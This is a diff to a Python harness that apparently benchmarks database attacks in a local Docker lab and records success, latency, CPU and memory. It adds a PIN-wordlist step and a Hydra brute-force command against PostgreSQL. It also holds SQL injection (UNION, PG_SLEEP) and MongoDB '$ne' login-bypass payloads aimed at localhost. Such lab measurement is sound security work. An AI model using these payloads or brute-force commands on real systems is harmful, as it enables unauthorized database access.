@@ -2,6 +2,7 @@
 import argparse
 import csv
 import json
+import re
 import subprocess
 import threading
 import time
@@ -18,6 +19,17 @@ MEASURE_SCRIPT_CANDIDATES = [
 RESULTS_DIR = Path("results")
 LOGS_DIR = RESULTS_DIR / "logs"
 CSV_PATH = RESULTS_DIR / "attack_metrics.csv"
+PIN_WORDLIST_PATH = RESULTS_DIR / "pins_4digit_top1000.txt"
+PIN_SOURCE_CANDIDATES = [
+    Path(
+        "/opt/SecLists/Passwords/Common-Credentials/"
+        "four-digit-pin-codes-sorted-by-frequency-withcount.csv"
+    ),
+    Path(
+        "/opt/seclists/Passwords/Common-Credentials/"
+        "four-digit-pin-codes-sorted-by-frequency-withcount.csv"
+    ),
+]
 
 
 @dataclass
@@ -31,11 +43,96 @@ class Attack:
     cpu_service: str
     latency_args: Optional[Sequence[str]] = None
     latency_run_during: bool = False
+    extra_note: Optional[str] = None
 
 
 def ensure_dirs() -> None:
     RESULTS_DIR.mkdir(exist_ok=True)
     LOGS_DIR.mkdir(exist_ok=True)
+
+
+def copy_into_attack_client(local_path: Path, container_path: str) -> Tuple[bool, str]:
+    container_dir = str(Path(container_path).parent)
+    subprocess.run(
+        [
+            "docker",
+            "compose",
+            "exec",
+            "attack-client",
+            "mkdir",
+            "-p",
+            container_dir,
+        ],
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    command = [
+        "docker",
+        "compose",
+        "cp",
+        str(local_path),
+        f"attack-client:{container_path}",
+    ]
+    result = subprocess.run(
+        command,
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    if result.returncode != 0:
+        return False, result.stderr.strip() or result.stdout.strip()
+    return True, ""
+
+
+def sync_attack_scripts() -> None:
+    host_dir = Path(__file__).resolve().parent
+    command = [
+        "docker",
+        "compose",
+        "cp",
+        f"{host_dir}/.",
+        "attack-client:/root/attack-scripts/",
+    ]
+    result = subprocess.run(command, capture_output=True, text=True, check=False)
+    if result.returncode != 0:
+        print(f"[警告] 同步攻击脚本失败: {result.stderr.strip()}")
+
+
+def prepare_pin_wordlist(top_n: int = 1000) -> Tuple[Optional[str], Optional[str]]:
+    ensure_dirs()
+    if PIN_WORDLIST_PATH.exists():
+        ok, err = copy_into_attack_client(
+            PIN_WORDLIST_PATH, "/root/attack-scripts/pins_4digit_top1000.txt"
+        )
+        if ok:
+            return "/root/attack-scripts/pins_4digit_top1000.txt", None
+        return None, f"复制 PIN 字典失败: {err}"
+
+    for candidate in PIN_SOURCE_CANDIDATES:
+        if not candidate.exists():
+            continue
+        pins: List[str] = []
+        with candidate.open("r", encoding="utf-8", errors="ignore") as handle:
+            reader = csv.reader(handle)
+            for row in reader:
+                if not row:
+                    continue
+                value = row[0].strip()
+                if value.isdigit() and len(value) == 4:
+                    pins.append(value)
+                if len(pins) >= top_n:
+                    break
+        if not pins:
+            continue
+        PIN_WORDLIST_PATH.write_text("\n".join(pins) + "\n", encoding="utf-8")
+        ok, err = copy_into_attack_client(
+            PIN_WORDLIST_PATH, "/root/attack-scripts/pins_4digit_top1000.txt"
+        )
+        if ok:
+            return "/root/attack-scripts/pins_4digit_top1000.txt", None
+        return None, f"复制 PIN 字典失败: {err}"
+    return None, "未找到 SecLists PIN 字典，请确认 /opt/SecLists 已克隆"
 
 
 def resolve_measure_script_path() -> Optional[str]:
@@ -63,10 +160,34 @@ def resolve_container_name(service: str) -> str:
     return service
 
 
-def monitor_cpu(
+def _parse_memory_value(value: str) -> Optional[float]:
+    match = re.match(r"\s*([0-9]*\.?[0-9]+)\s*([KMGTP]?i?B)\s*", value)
+    if not match:
+        return None
+    number = float(match.group(1))
+    unit = match.group(2).lower()
+    factor_map = {
+        "b": 1,
+        "kib": 1024,
+        "mib": 1024**2,
+        "gib": 1024**3,
+        "tib": 1024**4,
+        "kb": 1000,
+        "mb": 1000**2,
+        "gb": 1000**3,
+        "tb": 1000**4,
+    }
+    factor = factor_map.get(unit)
+    if factor is None:
+        return None
+    return number * factor
+
+
+def monitor_resources(
     container: str,
     stop_event: threading.Event,
-    samples: List[float],
+    cpu_samples: List[float],
+    mem_samples: List[float],
     interval: float = 0.75,
 ) -> None:
     while not stop_event.is_set():
@@ -78,18 +199,35 @@ def monitor_cpu(
                     container,
                     "--no-stream",
                     "--format",
-                    "{{.CPUPerc}}",
+                    "{{.CPUPerc}}|{{.MemUsage}}|{{.MemPerc}}",
                 ],
                 capture_output=True,
                 text=True,
                 check=False,
             )
             if result.returncode == 0 and result.stdout.strip():
-                value = result.stdout.strip().splitlines()[0].strip().rstrip("%")
+                sample_line = result.stdout.strip().splitlines()[0]
+                cpu_part, mem_usage_part, mem_percent_part = (
+                    part.strip() for part in sample_line.split("|", 2)
+                )
+                cpu_value = cpu_part.rstrip("%")
                 try:
-                    samples.append(float(value))
+                    cpu_samples.append(float(cpu_value))
                 except ValueError:
                     pass
+                mem_percent_value = mem_percent_part.rstrip("%")
+                try:
+                    mem_samples.append(float(mem_percent_value))
+                except ValueError:
+                    mem_bytes = _parse_memory_value(mem_usage_part.split("/", 1)[0])
+                    mem_limit_part = (
+                        mem_usage_part.split("/", 1)[1].strip()
+                        if "/" in mem_usage_part
+                        else ""
+                    )
+                    limit_bytes = _parse_memory_value(mem_limit_part)
+                    if mem_bytes is not None and limit_bytes:
+                        mem_samples.append((mem_bytes / limit_bytes) * 100)
         except FileNotFoundError:
             # docker CLI not present
             break
@@ -187,6 +325,7 @@ def append_csv_row(row: Dict[str, object]) -> None:
                 "success_rate",
                 "avg_latency_ms",
                 "peak_cpu_percent",
+                "peak_mem_percent",
                 "notes",
                 "stdout_log",
                 "stderr_log",
@@ -218,10 +357,11 @@ def run_attack(config: Attack, measure_script_path: Optional[str]) -> Dict[str, 
 
     stop_event = threading.Event()
     cpu_samples: List[float] = []
+    mem_samples: List[float] = []
     container_name = resolve_container_name(config.cpu_service)
     monitor_thread = threading.Thread(
-        target=monitor_cpu,
-        args=(container_name, stop_event, cpu_samples),
+        target=monitor_resources,
+        args=(container_name, stop_event, cpu_samples, mem_samples),
         daemon=True,
     )
 
@@ -252,6 +392,7 @@ def run_attack(config: Attack, measure_script_path: Optional[str]) -> Dict[str, 
     write_logs(config.name, stdout, stderr)
 
     peak_cpu = max(cpu_samples) if cpu_samples else None
+    peak_mem = max(mem_samples) if mem_samples else None
 
     return {
         "tool": config.tool,
@@ -262,6 +403,7 @@ def run_attack(config: Attack, measure_script_path: Optional[str]) -> Dict[str, 
             None if latency_result is None else latency_result.get("avg_ms")
         ),
         "peak_cpu_percent": peak_cpu,
+        "peak_mem_percent": peak_mem,
         "notes": notes,
         "stdout_log": str((LOGS_DIR / f"{config.name}.stdout.log").resolve()),
         "stderr_log": str((LOGS_DIR / f"{config.name}.stderr.log").resolve()),
@@ -274,11 +416,47 @@ def run_attack(config: Attack, measure_script_path: Optional[str]) -> Dict[str, 
     }
 
 
-def build_attack_plan() -> List[Attack]:
+def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
     sqlmap_union_payload = "http://127.0.0.1:8081/pg/users?id=1%20UNION%20ALL%20SELECT%20NULL,current_database(),version()--"
     sqlmap_time_payload = "http://127.0.0.1:8081/pg/users?id=1%20AND%209999=(SELECT%209999%20FROM%20PG_SLEEP(1.5))"
     mongo_payload = "http://127.0.0.1:8081/mongo/login?username[$ne]=1&password[$ne]=1"
     pg_baseline_payload = "http://127.0.0.1:8081/pg/users?id=1"
+
+    brute_force_command: List[str]
+    brute_force_notes: Optional[str] = None
+    if pin_wordlist:
+        brute_force_command = [
+            *BASE_EXEC,
+            "hydra",
+            "-l",
+            "shortuser",
+            "-P",
+            pin_wordlist,
+            "postgres-db",
+            "postgres",
+            "-s",
+            "5432",
+            "-V",
+            "-I",
+            "-t",
+            "4",
+        ]
+    else:
+        brute_force_command = [
+            *BASE_EXEC,
+            "hydra",
+            "-l",
+            "shortuser",
+            "-x",
+            "4:4:1",
+            "postgres-db",
+            "postgres",
+            "-s",
+            "5432",
+            "-V",
+            "-I",
+        ]
+        brute_force_notes = "未找到 PIN 字典，回退到纯暴力枚举"
 
     return [
         Attack(
@@ -406,20 +584,7 @@ def build_attack_plan() -> List[Attack]:
             tool="Hydra",
             target="PostgreSQL",
             technique="暴力破解",
-            command=[
-                *BASE_EXEC,
-                "hydra",
-                "-l",
-                "shortuser",
-                "-x",
-                "4:4:0123456789",
-                "postgres-db",
-                "postgres",
-                "-s",
-                "5432",
-                "-V",
-                "-I",
-            ],
+            command=brute_force_command,
             success_parser=parse_hydra_success,
             cpu_service="postgres-db",
             latency_args=[
@@ -431,13 +596,14 @@ def build_attack_plan() -> List[Attack]:
                 "0.5",
             ],
             latency_run_during=True,
+            extra_note=brute_force_notes,
         ),
     ]
 
 
 def summarize(results: List[Dict[str, object]]) -> None:
     print("\n=== 攻击汇总 ===")
-    header = f"{'工具':<10}{'目标数据库':<15}{'攻击类型':<16}{'成功率%':>10}{'平均延迟ms':>14}{'峰值CPU%':>12}"
+    header = f"{'工具':<10}{'目标数据库':<15}{'攻击类型':<16}{'成功率%':>10}{'平均延迟ms':>14}{'峰值CPU%':>12}{'峰值内存%':>12}"
     print(header)
     print("-" * len(header))
     for item in results:
@@ -451,9 +617,14 @@ def summarize(results: List[Dict[str, object]]) -> None:
             if isinstance(item.get("peak_cpu_percent"), (int, float))
             else "-"
         )
+        peak_mem = (
+            f"{item['peak_mem_percent']:.1f}"
+            if isinstance(item.get("peak_mem_percent"), (int, float))
+            else "-"
+        )
         print(
             f"{item['tool']:<10}{item['target_database']:<15}{item['attack_type']:<16}"
-            f"{item['success_rate']:>10}{avg_latency:>14}{peak_cpu:>12}"
+            f"{item['success_rate']:>10}{avg_latency:>14}{peak_cpu:>12}{peak_mem:>12}"
         )
     print()
 
@@ -467,9 +638,21 @@ def main() -> None:
         nargs="*",
         help="Optional attack names to skip (e.g., sqlmap_mongo_nosql)",
     )
+    parser.add_argument(
+        "--pin-top",
+        type=int,
+        default=1000,
+        help="Number of top PINs to extract from SecLists (default: 1000).",
+    )
     args = parser.parse_args()
 
     ensure_dirs()
+    sync_attack_scripts()
+    pin_wordlist, pin_error = prepare_pin_wordlist(args.pin_top)
+    if pin_wordlist:
+        print(f"[信息] 已准备 PIN 字典: {pin_wordlist}")
+    elif pin_error:
+        print(f"[警告] {pin_error}")
     measure_script_path = resolve_measure_script_path()
     if measure_script_path:
         print(f"[信息] 使用延迟测量脚本: {measure_script_path}")
@@ -479,7 +662,7 @@ def main() -> None:
         )
     results: List[Dict[str, object]] = []
 
-    for attack in build_attack_plan():
+    for attack in build_attack_plan(pin_wordlist):
         if args.skip and attack.name in args.skip:
             print(f"跳过 {attack.name}")
             continue
@@ -493,6 +676,7 @@ def main() -> None:
             "success_rate": result["success_rate"],
             "avg_latency_ms": result["avg_latency_ms"],
             "peak_cpu_percent": result["peak_cpu_percent"],
+            "peak_mem_percent": result["peak_mem_percent"],
             "notes": result["notes"],
             "stdout_log": result["stdout_log"],
             "stderr_log": result["stderr_log"],
@@ -509,7 +693,15 @@ def main() -> None:
         else:
             print("[警告] 未能收集 CPU 数据。请确认 docker CLI 可用。")
 
-        print(f"[结果] {result['notes']}")
+        if result.get("peak_mem_percent") is not None:
+            print(f"[信息] 峰值内存 {result['peak_mem_percent']:.1f}%")
+        else:
+            print("[警告] 未能收集内存数据。请确认 docker CLI 可用。")
+
+        note_text = result["notes"]
+        if attack.extra_note:
+            note_text = f"{note_text} ({attack.extra_note})"
+        print(f"[结果] {note_text}")
         results.append(result)
 
     summarize(results)
